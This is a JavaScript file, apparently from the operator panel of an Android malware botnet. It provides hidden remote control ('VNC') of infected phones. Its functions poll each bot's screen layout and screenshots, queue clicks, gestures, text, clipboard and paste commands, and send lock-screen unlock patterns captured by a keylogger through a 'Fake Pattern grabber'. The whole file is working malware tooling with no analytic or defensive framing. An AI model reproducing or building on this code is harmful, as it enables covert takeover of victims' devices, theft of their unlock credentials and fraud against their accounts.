
function toggleLayout()
{
	if($('#show_layout').is(':checked')){
		$('.element').each(function(e){ $(this).addClass('active'); })
		$.cookie('show_layout', "true")
		$('#showLayoutLabel I').css('color', 'black')
	}else{
		$('.element').each(function(e){ $(this).removeClass('active'); })
		$.cookie('show_layout', "false")
		$('#showLayoutLabel I').css('color', '#999')
	}
}

function toggleScreen()
{
	if($('#show_screen').is(':checked')){
		$('#layout_screenshot').show()
		$.cookie('show_screen', "true")
		$('#showScreenLabel I').css('color', 'black')
	}else{
		$('#layout_screenshot').hide()
		$.cookie('show_screen', "false")
		$('#showScreenLabel I').css('color', '#999')
	}
}

function get_layout(bot_id, scale)
{
	var offset = $("#layout").offset()
	document.current_scale = scale

	var data = {
		'a':'admin', 
		'action':'bots', 
		'ajax': 'vnc_get_layout', 
		'bot_id':bot_id, 
		'scale':scale,
		'relative_left': offset.left,
		'relative_top': offset.top
	}
	
	$.post('index.php', data, function(data) {
		}).done(function(data){ 
		if(data.indexOf('VNC_ERROR:') > -1)
		{
			// raw_status: layout:on;screen:on;sound:forbid;backlight:off;
			//show_message('Layout loading error:' + data, 'error', false)
			$('#vnc_status').html("<b style='color: red'>Disabled</b>")
			$('#layout').hide()
			$('#layout_screenshot').hide()
			$('#layout_keyboard').hide()
			$('#commandsPanel').hide()
			
			show_message('VNC is disabled, redirecting to the list of VNC sessions', 'error', false)
			
			// stop autoupdate
			$('#auto_update').prop("checked", false)
			$.cookie('auto_update', "false")
			clearInterval(window.interval)
			window.interval = undefined
			
			// open top menu
			//~ $("#topMenu").toggle()
			setTimeout(function()
			{
				location.href = "?a=admin&action=vnc"
			}, 3000)
			
			return
			
		}else{
			
			var json = $.parseJSON(data)
			
			$('#sendPatternBtn').prop("disabled", !json['has_lockPatternView'])
			
			if(json['current_tasks'] != 0)
			{
				$('#task_loading').show()
				$('#tasks_amount').text(json['current_tasks'])
			}else
				$('#task_loading').hide()

			$('#vnc_status').html(json['status'])

// fix screen text_only state depends from current status
			if(json['raw_status'].indexOf('screen:on;') != -1 && 
			location.href.indexOf('&text_only=1') != -1)
			{
				location.href = location.href.replace('&text_only=1', '')
			}
			
			if(json['raw_status'].indexOf('screen:on;') == -1 && 
			location.href.indexOf('&text_only=1') == -1)
			{
				location.href = location.href + '&text_only=1'
			}

			var w = json['display_width']
			var h = json['display_height']
			var is_vertical = json['is_layout_vertical']
			
			$('#last_seen').html(json['last_seen'])
			
			if(json['is_screen_unlocked'])
			{
				 $("#screen_on_button").hide()
				 $("#screen_off_button").show()
			}else{
				 $("#screen_on_button").show()
				 $("#screen_off_button").hide()
			}
			
			//~ console.log('xml w:' + w + '; h:' + h + '; is_vertical: ' + is_vertical)

			if((is_vertical && w > h) || (!is_vertical && h > w))
			{
				var tmp = w
				w = h
				h = tmp
			}

			$("#layout").width(w)
			$("#layout").height(h)
			$("#layout_screenshot").width(w)
			$("#layout_keyboard").width(w)
			
			//~ $("#layout_screenshot").height(h)
			//~ console.log('screenshot width set to W:' + w)
			
			$("#layout").html(json['layout'])
		
			if($('#show_layout').is(':checked')){
				$('.element').each(function(e){ $(this).addClass('active'); })
			}
			
			if($('#show_screen').is(':checked')){
				$('#layout_screenshot').show()
			}
			
			//~ $(".element .active").on("click", function(event){
				//~ event.stopPropagation(); //~ console.log( "I was clicked, but my parent will not be." );
				//~ clickElem(event.target.id)
				//~ //chooseElem(event.target.id)
			//~ });
			
			$("#layout .element").on("click", function(event){
				event.stopPropagation(); //~ console.log( "I was clicked, but my parent will not be." );
				//clickElem(event.target.id)
				
				document.body.scrollTop = document.documentElement.scrollTop = 0;

				if($('#' + event.target.id).data('node_rect') === undefined)
				{
					console.log('no node_rect found')
					return;
				}
				
				// "left top right bottom"
				var parts = $('#' + event.target.id).data('node_rect').split(' ')
			
				var left_orig = parseInt(parts[0])
				var top_orig = parseInt(parts[1])
			
				var x = left_orig + (event.offsetX / document.current_scale)
				var y = top_orig + (event.offsetY / document.current_scale)
				
				x = Number((x).toFixed());
				y = Number((y).toFixed());

				if(window.selection_mode == true)
				{
					collectDots(x, y, event.pageX, event.pageY)
					return
				}

				clickPosition(x, y)
			});
		}
	})
}

// global actions
// home, back, recents, power
function send_action(action)
{
	// see bots.class.php
	
	var data = {
		'a':'admin', 
		'action':'bots', 
		'ajax': 'vnc_set_task', 
		'bot_id':window.bot_id, 
		'type': 'action',
		'data': action
	}
	
	$.post('index.php', data, function(data) {
	}).done(function(data){ 
		if(data.indexOf('SUCCESS') > -1)
		{
			window.parent.show_message('Action sent', 'ok', true)
		}else{
			window.parent.show_message('Action sending error:' + data, 'error', false)
		}
	})
}

function clickPosition(x, y)
{
	console.log('vnc.js clickPosition x:' + x + '; y: ' + y)
	var coords = x + ' ' + y
	
	var data = {
		'a':'admin', 
		'action':'bots', 
		'ajax': 'vnc_set_task',
		'bot_id':window.bot_id, 
		'type': 'click_at',
		'data': coords
	}
	
	$.post('index.php', data, function(data) {
		}).done(function(data){ 
			if(data.indexOf('ADDED_SUCCESS') > -1)
			{
				window.parent.show_message('Click to ' +coords.replace(' ', 'x') + ' added', 'ok', true)
			}else{
				window.parent.show_message('Click add error:' + data, 'error', false)
			}
	})
}

function clickElem(eid)
{
	// COUNT x/y of center of element with id EID
	
	// left top right bottom
	var rect = $('#' + eid).data('node_rect')
	var parts = rect.split(' ')
	
	var left = parts[0]
	var top = parts[1]
	var right = parts[2]
	var bottom = parts[3]
	
	var w = right - left
	var h = bottom - top
	
	var x = Number(left) + Number(w/2)
	var y = Number(top) + Number(h/2)
	
	var coords = Math.floor(x) + ' ' + Math.floor(y)
	
	console.log('vnc.js clickElem #' + eid + '; coords: ' + coords)
	var data = {
		'a':'admin', 
		'action':'bots', 
		'ajax': 'vnc_set_task', 
		'bot_id': window.bot_id, 
		'type': 'click_at',
		'data': coords
	}
	
	$.post('index.php', data, function(data) {
		}).done(function(data){ 
			if(data.indexOf('ADDED_SUCCESS') > -1)
			{
				window.parent.show_message('Click to ' +coords.replace(' ', 'x') + ' added', 'ok', true)
			}else{
				window.parent.show_message('Click add error:' + data, 'error', false)
			}
	})
}

function toggleUpdate()
{
	if($('#auto_update').is(':checked') && window.interval == undefined)
	{
		$('#updateLabel I').css('color', 'black')
		console.log("Update started")
		$.cookie('auto_update', "true")
		window.interval = window.setInterval( function(){ 
			
			// refresh xml layout
			get_layout(window.bot_id, window.scale)
			
			// refresh screenshot
			if(location.href.indexOf('&text_only=1') == -1)
			{
				var src = $("#layout_screenshot").attr("src").split('?rnd=')[0]
				$("#layout_screenshot").attr("src", src + "?rnd=" + (new Date()).getTime())
			}
			
		}, 1000 ); 
		
	}else{
		console.log("Update stopped")
		$('#updateLabel I').css('color', '#999')
		$.cookie('auto_update', "false")
		clearInterval(window.interval)
		window.interval = undefined
	}
}

function show_commands(ids)
{
	if($('#commandsPanel').is(":visible"))
	{
		$('#commandsPanel').hide()
		return
	}

	//alert(ids)
	
	var data = {
		'a':'admin', 
		'action':'bots', 
		'ajax': 'get_mass_commands', 
		'ids':ids,
		'target_blank':'true'
	}
	
	$.post('', data, function(data) {

	}).done(function(data){ 
		$("#commandsPanelBody").html(data)
	})
	

	$('#commandsPanel').show()
}

function send_long_click(UID)
{
	console.log('vnc.js send_long_click to #' + UID)
	var data = {
		'a':'admin', 
		'action':'bots', 
		'ajax': 'vnc_set_task', 
		'bot_id': window.bot_id, 
		'type': 'long_click',
		'data': UID
	}
	
	$.post('index.php', data, function(data) {
		}).done(function(data){ 
			if(data.indexOf('ADDED_SUCCESS') > -1)
			{
				window.parent.show_message('Long click sent', 'ok', true)
			}else{
				window.parent.show_message('Error send long click:' + data, 'error', false)
			}
	})
}

function set_text(UID, text)
{
	console.log('vnc.js set_text to #' + UID + '; text: ' + text)
	var data = {
		'a':'admin', 
		'action':'bots', 
		'ajax': 'vnc_set_task', 
		'bot_id':window.bot_id, 
		'type': 'set_text',
		'data': UID + '|' + text
	}
	
	$.post('index.php', data, function(data) {
		}).done(function(data){ 
			if(data.indexOf('ADDED_SUCCESS') > -1)
			{
				window.parent.show_message('Text set: ' + text, 'ok', true)
			}else{
				window.parent.show_message('Error set text:' + data, 'error', false)
			}
	})
}

$(function(){
    $.contextMenu({
        selector: '.context-menu-one', 
        callback: function(key, options) {

			var selected_uid = $('#' + document.last_target_id).data('uid')

            if(key == "set_text")
            {
				var text = prompt("Enter the text to set in field")
				set_text(selected_uid, text)

			}else if(key == "clear"){
				set_text(selected_uid, "")
				
			}else if(key == "long_click"){
				send_long_click(selected_uid)
			
			}else if(key == "set_clip"){
				var text = prompt("Enter the text for clipboard")
				set_clip(text)

			}else if(key == "paste"){
				paste(selected_uid)
				
			}else if(key == "scroll_forward"){
				scroll(selected_uid, "forward") // use clickElem to get x/y

			}else if(key == "scroll_backward"){
				scroll(selected_uid, "backward")

			}else if(key == "node_info"){
				console.log(selected_uid)
				var text = $('#' + document.last_target_id).attr('title')
				text = text.replace(/\n/g,'<br />')
				text = '<p class="text-left">' + text + '</p>'
				window.parent.show_message(text, 'ok', false)
			}
        },
        items: {
            "set_text": {name: "Set text", icon: "edit"},
            "clear": {name: "Clear", icon: ""},
            "long_click": {name: "Long click"},
            "set_clip": {name: "Set text to clip", icon: "copy"},
            "paste": {name: "Paste from clip", icon: "paste"},
            "sep1": "---------",
            "scroll_backward": {name: "Scroll up", icon: "up"},
            "scroll_forward": {name: "Scroll down", icon: "down"},
            "sep2": "---------",
            "node_info": {name: "Show info", icon: ""},
        }
    });
    
    //~ $('.context-menu-one').on('click', function(e){
        //~ alert('clicked');
    //~ })
    
	$(document).mousedown(function(e){ 
		if(e.button == 2) { 
			document.last_target_id = e.target.id
			return false; 
		}
	
		return true; 
	});
  
});

function scroll(selected_uid, direction)
{
	// left top right bottom
	var rect = $('#div_' + selected_uid).data('node_rect')
	
	if(rect === undefined) 
	{
		console.log('vnc.js scroll no coords')
		console.log($('#' + selected_uid))
		return
	}
	
	var parts = rect.split(' ')
	
	var left = parts[0]
	var top = parts[1]
	var right = parts[2]
	var bottom = parts[3]
	
	var w = right - left
	var h = bottom - top
	
	var x = Number(left) + Number(w/2)
	var y = Number(top) + Number(h/2)
	
	var coords = Math.floor(x) + ' ' + Math.floor(y)
	
	console.log('vnc.js scroll coords: ' + coords + '; direction: ' + direction)
	
	var data = {
		'a':'admin', 
		'action':'bots', 
		'ajax': 'vnc_set_task', 
		'bot_id': window.bot_id, 
		'type': 'scroll',
		'data': direction +'|'+ coords
	}
	
	$.post('index.php', data, function(data) {
		}).done(function(data){ 
			if(data.indexOf('ADDED_SUCCESS') > -1)
			{
				window.parent.show_message('Scroll ' + direction + ' added', 'ok', true)
			}else{
				window.parent.show_message('Scroll send error:' + data, 'error', false)
			}
	})
}

function set_clip(text)
{
	console.log('vnc.js set_clip: ' + text)
	
	var data = {
		'a':'admin',
		'action':'bots',
		'ajax': 'vnc_set_task', 
		'bot_id': window.bot_id, 
		'type': 'set_clip',
		'data': text
	}

	$.post('index.php', data, function(data) {
		}).done(function(data){ 
			if(data.indexOf('ADDED_SUCCESS') > -1)
			{
				window.parent.show_message('Clip text set: ' + text + '', 'ok', true)
			}else{
				window.parent.show_message('Clip set error:' + data, 'error', false)
			}
	})
}

function paste(selected_uid)
{
	console.log('vnc.js paste UID: ' + selected_uid)
	
	var data = {
		'a':'admin',
		'action':'bots',
		'ajax': 'vnc_set_task', 
		'bot_id': window.bot_id, 
		'type': 'paste',
		'data': selected_uid
	}

	$.post('index.php', data, function(data) {
		}).done(function(data){ 
			if(data.indexOf('ADDED_SUCCESS') > -1)
			{
				window.parent.show_message('Paste action sent', 'ok', true)
			}else{
				window.parent.show_message('Paste action error:' + data, 'error', false)
			}
	})
}

function sendPattern()
{
	var pattern = prompt("Enter pattern code from keylogger (e.g. 1;2;3;4 or ->1->2->3)", "")

	if(pattern === undefined || pattern == null)
		return;
	
	// apply Fake Pattern grabber format: "->8->5->2->1->4->7"
	pattern = pattern.trim().replaceAll('->', ';')
	if(pattern.startsWith(';')) 
		pattern = pattern.substr(1)

	if(pattern == "" || pattern.match(/;/igm).length < 3)
	{
		window.parent.show_message('Bad pattern: ' + pattern, 'error', false)
		return
	}
	
	console.log('vnc.js send pattern: ' + pattern)
	
	var data = {
		'a':'admin',
		'action':'bots',
		'ajax': 'vnc_set_task', 
		'bot_id': window.bot_id, 
		'type': 'send_pattern',
		'data': pattern
	}

	$.post('index.php', data, function(data) {
		}).done(function(data){ 
			if(data.indexOf('ADDED_SUCCESS') > -1)
			{
				window.parent.show_message('Pattern sent', 'ok', true)
			}else{
				window.parent.show_message('Pattern send error:' + data, 'error', false)
			}
	})
}


function gestureBuilder()
{
	$('#buttonArea').hide()
	$('#gestureBuilderPanel').show()
	$('#auto_update').prop("checked", false)
	toggleUpdate()
	window.selection_mode = true
	window.pattern_dots = []
	$('#dotsCollected').html(window.pattern_dots.length)
}

function sendGesture()
{
	if(window.pattern_dots.length == 0)
	{
		window.parent.show_message('No dots added', 'error', true)
		return
	}
	
	// script = '5|1000|gesture|300:400;500:800;200:900;'
	var script = ''
	script += $('#gest_repeat').val() + '|'
	script += $('#gest_duration').find(":selected").val() + '|'
	script += $('input[name="gest_type"]:checked').val() + '|'

	for(var i=0; i<window.pattern_dots.length; i++)
	{
		var dot = window.pattern_dots[i][0] + ':' + window.pattern_dots[i][1]
		script += dot + ';'
	}
	
	console.log(script)
	resetGesture()
	
	var data = {
		'a':'admin', 
		'action':'bots', 
		'ajax': 'vnc_set_task', 
		'bot_id':window.bot_id, 
		'type': 'gesture',
		'data': script
	}
	
	$.post('index.php', data, function(data) {
	}).done(function(data){ 
		if(data.indexOf('SUCCESS') > -1)
		{
			window.parent.show_message('Action sent', 'ok', true)
			closeGesturePanel()
		}else{
			window.parent.show_message('Action sending error:' + data, 'error', false)
		}
	})
}

function collectDots(x, y, mouseX, mouseY)
{
	console.log('collected ' + x + ':' + y)
	window.pattern_dots.push([x, y])
	var id = 'dot' + (window.pattern_dots.length)
	
	createDot(id, mouseX, mouseY)
	$('#dotsCollected').html(window.pattern_dots.length)
	
}

function cancelGesture()
{
	resetGesture()
	closeGesturePanel()
}

function closeGesturePanel()
{
	$('#gestureBuilderPanel').hide()
	$('#buttonArea').show()
	$('#auto_update').prop("checked", true)
	toggleUpdate()
	window.selection_mode = false
}

function resetGesture()
{
	for(var i=1; i<=window.pattern_dots.length; i++)
		$("#dot" + i).remove()
	
	window.pattern_dots = 0
}

function createDot(id, x, y)
{
	var el = document.createElement("div");  
	
	$(el).prop("id", id)
	//$(el).html("&bull;")
	$(el).html(id.replace('dot', ''))
	$(el).css("z-index", 99999)
	$(el).css("position", "fixed")
	$(el).css("left", x)
	$(el).css("top", y)
	$(el).css("font-size", "10pt")
	$(el).css("color", "white")
	$(el).css("font-weight", "bold")
	$(el).css("background-color", "red")
	$(el).css("border", "1px solid red")
	$(el).css("border-radius", "10px")
	$(el).css("width", "20px")
	$(el).css("text-align", "center")

	document.body.appendChild(el); 
}
